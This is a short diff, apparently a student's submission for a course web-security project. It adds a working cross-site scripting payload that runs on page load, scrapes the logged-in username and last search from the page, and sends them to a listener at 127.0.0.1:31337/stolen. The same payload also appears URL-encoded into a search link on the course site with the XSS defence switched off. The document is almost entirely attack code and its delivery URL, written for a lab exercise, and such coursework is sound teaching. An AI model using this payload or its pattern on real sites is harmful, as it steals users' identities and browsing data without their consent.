@@ -1,0 +1,11 @@
+<script>
+	function attack() {
+		var username = $('#logged-in-user').text();
+		var last_search = $('.list-group-item:eq(1)').text();
+		var url = 'https://127.0.0.1:31337/stolen?user=' + username  + '&last_search=' + last_search;
+		$.get(url);
+	}
+window.onload = attack;
+</script>
+
+https://eecs388.org/project2/search?xxsdefense=0&q=%3Cscript%3E%0D%0A%09function%20attack%28%29%20%7B%0D%0A%09%09var%20username%20%3D%20%24%28%27%23logged-in-user%27%29.text%28%29%3B%0D%0A%09%09var%20last_search%20%3D%20%24%28%27.list-group-item%3Aeq%281%29%27%29.text%28%29%3B%0D%0A%09%09var%20url%20%3D%20%27https%3A%2F%2F127.0.0.1%3A31337%2Fstolen%3Fuser%3D%27%20%2B%20username%20%20%2B%20%27%26last_search%3D%27%20%2B%20last_search%3B%0D%0A%09%09%24.get%28url%29%3B%0D%0A%09%7D%0D%0Awindow.onload%20%3D%20attack%3B%0D%0A%3C%2Fscript%3E
